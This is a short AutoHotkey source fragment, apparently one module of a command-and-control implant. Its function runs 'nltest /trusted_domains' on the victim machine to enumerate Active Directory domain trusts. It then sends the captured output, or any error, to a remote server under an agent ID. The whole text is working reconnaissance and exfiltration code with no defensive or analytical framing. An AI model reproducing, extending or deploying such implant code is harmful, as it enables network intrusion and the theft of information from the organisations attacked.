; ============================================================================
; DOMAIN TRUST RECONNAISSANCE MODULE
; ============================================================================
; Enumerates trusted domains in the Active Directory
; ============================================================================

DomainTrustRecon() {
    comspec := EnvGet("ComSpec")

    try {
        ; Execute the trusted domains command and capture output
        shell := ComObject("WScript.Shell")
        exec := shell.Exec(comspec . " /c nltest /trusted_domains")
        output := exec.StdOut.ReadAll()

        ; Format the data with header
        data := "Trusted Domains:`n"
        data .= "----------------------------------------`n"
        data .= output

        ; Send results to server
        message := Format("command_output|{}|{}", this.agentID, data)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

    } catch Error as err {
        errorMsg := "Error retrieving domain trust information: " . err.Message
        message := Format("command_output|{}|{}", this.agentID, errorMsg)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }
}
